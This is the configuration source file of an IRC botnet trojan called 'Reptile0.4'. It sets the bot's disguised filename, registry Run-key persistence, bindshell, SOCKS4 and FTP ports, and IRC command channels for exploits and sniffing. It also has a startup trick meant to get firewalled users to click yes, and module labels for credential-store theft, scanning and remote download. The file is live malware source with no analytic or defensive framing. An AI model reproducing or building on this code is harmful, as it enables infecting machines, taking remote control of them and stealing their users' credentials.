
char mutexhandle[]		= "0xFFFFFFFF";//*mutex handle

#ifndef _DEBUG
char botid[]			= "0.37";				//*bot id
#else
char botid[]			= "debug";
#endif

unsigned short ftpdport	= 5219;					//*ftpd port
BOOL staticftpd			= FALSE;				// always use ftpdport for the ftpd port
unsigned short sock4port= 2156;					// socks4 port
unsigned short redirport= 7090;					// redirect local port
unsigned short bindport = 3169;					//*bindshell port most of the exploits use

char prefix				= '.';					//*command prefix
char movepath[]			= "%windir%";			//*path to move to

#ifdef _DEBUG
char debug_log[]		= "C:\\msnrgns.txt";
char debug_log_mode[]	= "a+";//"w+";
#endif

//--------------------------------------------------------------------------------------------------------
#ifndef NO_CRYPT // Encrypted
//--------------------------------------------------------------------------------------------------------


//--------------------------------------------------------------------------------------------------------
#else // Not encrypted
//--------------------------------------------------------------------------------------------------------

#ifndef _DEBUG
	char filename[]			= "msnrgns.exe";			// bot filename (keep even if random fname is enabled (for fname len))
#else
	char filename[]			= "msnrgnrs.exe";		// bot filename (keep even if random fname is enabled (for fname len))
#endif // _DEBUG

#ifndef NO_FCONNECT
	char cononstart[]		= "http://windowsupdate.microsoft.com/";// open this url on startup to try to get
#endif																// firewalled people to click yes

	char version[]			= "Reptile0.4";			// public bot version

	#ifdef _DEBUG
	char *authost[] = { "*!*@*" };
	#else
	char *authost[]			= {						// auth hosts
	//	"nick!ident@host",
		"*!*@*",
	};
	#endif


	char *versionlist[]		= {						// version list
		"mIRC v6.14 Khaled Mardam-Bey",
	};


#ifndef NO_SERVICE
	char servicename[]		= "virus";
	char servicedisplayname[]="change me";
	char servicedesc[]		= "go to hell";
#else
	REGENT runkey = { HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "virus" };
#endif

	char password[]			= "pass";				// bot password
	
	BOOL bmodeonjoin		= FALSE;

	SERVER servers[]={
		{
			"127.0.0.1"//server
			"",//pass
			6667,//port
			FALSE,//ssl
			"#x",//mainchan
			"r",//key
			"",//modeonconn
			"",//modeonjoin
			"#exp",//exploitchan
			"#sniff",//sniffchan
			"#warn"//warnchan
		},
	};

	#ifndef NO_MELT
	REGENT meltkey=	{ HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions", "MeltMe" };
	#endif
	#ifndef NO_RECORD_UPTIME
	REGENT rupkey=	{ HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions", "Record" };
	#endif
	#ifndef NO_INSTALLED_TIME
	REGENT itkey=	{ HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions", "Installed Time" };
	#endif

//--------------------------------------------------------------------------------------------------------
#endif
//--------------------------------------------------------------------------------------------------------

char main_title[]		= "MAIN//";
char threads_title[]	= "THREADS//";
char process_title[]	= "PROC//";
char irc_title[]		= "IRC//";
char sec_title[]		= "SECURE//";
char unsec_title[]		= "UNSECURE//";
char scan_title[]		= "SCAN//";
char ftp_title[]		= "FTP//";
char netinfo_title[]	= "NETINFO//";
char sysinfo_title[]	= "SYSINFO//";
char drives_title[]		= "DRIVES//";
char mirc_title[]		= "MIRC//";
char file_title[]		= "FILE//";
char download_title[]	= "DOWNLOAD//";
char update_title[]		= "UPDATE//";
char logic_title[]		= "LOGIC//";
char reg_title[]		= "REG//";
char pstore_title[]		= "PSTORE//";
char netstatp_title[]	= "NETSTATP//";
char sniffer_title[]	= "SNIFFER//";
char tcp_title[]		= "TCP//";
char udp_title[]		= "UDP//";
char speedtest_title[]	= "SPEEDTEST//";
char sock4_title[]		= "SOCKS4//";
char redirect_title[]	= "REDIRECT//";
char warn_title[]		= "\2WARN\2//";
